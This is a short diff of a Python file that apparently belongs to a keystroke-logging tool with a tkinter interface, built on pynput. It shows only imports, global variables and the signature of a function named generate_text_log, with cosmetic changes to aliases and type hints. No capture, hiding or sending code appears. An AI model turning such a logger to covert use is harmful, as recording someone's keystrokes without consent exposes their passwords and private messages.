@@ -6,14 +6,14 @@ from tkinter import Button as _Button
 from tkinter import Label as _Label
 from pynput import keyboard as _keyboard
 from typing import Any as _Any
-from datetime import datetime
+from datetime import datetime as _dt
 
 from json import dumps as _dumps
 
-keys_used: list = []
+keys_used: list | None = []
 flag: bool = False
 keys: str = ""
-now: datetime = datetime.now()
+now: _dt = _dt.now()
 
 
 def generate_text_log(key: _Any) -> None:
